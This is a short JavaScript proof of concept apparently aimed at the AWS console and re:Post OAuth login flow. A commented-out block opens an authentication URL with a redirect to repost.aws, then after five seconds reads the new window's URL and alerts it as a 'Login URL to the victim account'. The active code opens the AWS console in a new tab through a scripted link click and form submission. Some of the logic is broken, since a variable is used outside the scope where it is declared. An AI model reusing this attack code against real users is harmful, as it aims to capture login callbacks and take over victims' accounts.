
// // Open a new window
// function openNewWindow() {
//   let newWindow = window.open('https://eu-central-1.console.aws.amazon.com/cke/auth?region=eu-central-1&redirectUrl=https%3A%2Frepost.aws%2Fapi%2Fv1%2Fidentity%2Faws%2Fcallback%3Fstate%3DeyJub25jZSI6IlhtWUI1V2hSUXdHN2IxX2RUZ1ZqSmcifQ&challenge=DU8HEwzh_enBtW4w7CNZGr1dwx-lrxMZa58_EL0ezGQ', '_blank');
// };
// // Check if the new window was successfully created
// window.onload = function() {
//             document.body.setAttribute('onload', 'openNewWindow()');
// };

// if (newWindow) {
//   // Wait for 5 seconds before accessing the URL of the new window
//   setTimeout(function () {
//     // Access the URL of the new window
//     let url = newWindow.location.href;
//     let modifiedUrl = url.replace(/https:\/\/.*\.console\.aws\.amazon\.com\//, 'https://');
//     alert("Login URL to the victim account: " + modifiedUrl);
//   }, 5000); // 5000 milliseconds = 5 seconds
// } else {
//   alert("nothing");
// }
// Replace the content of the <html> element
var link = document.createElement('a');
link.href = 'https://eu-central-1.console.aws.amazon.com';  // URL of the new page
link.target = '_blank';  // Open in new tab
document.body.appendChild(link);  // Append the link to the DOM
link.click();  // Programmatically trigger a click event
document.body.removeChild(link);  // Clean up the DOM

var form = document.createElement('form');
form.method = 'GET';
form.action = 'https://eu-central-1.console.aws.amazon.com';  // URL of the new page
form.target = '_blank';  // Open in new tab
document.body.appendChild(form);
form.submit();
document.body.removeChild(form);  // Clean up the DOM
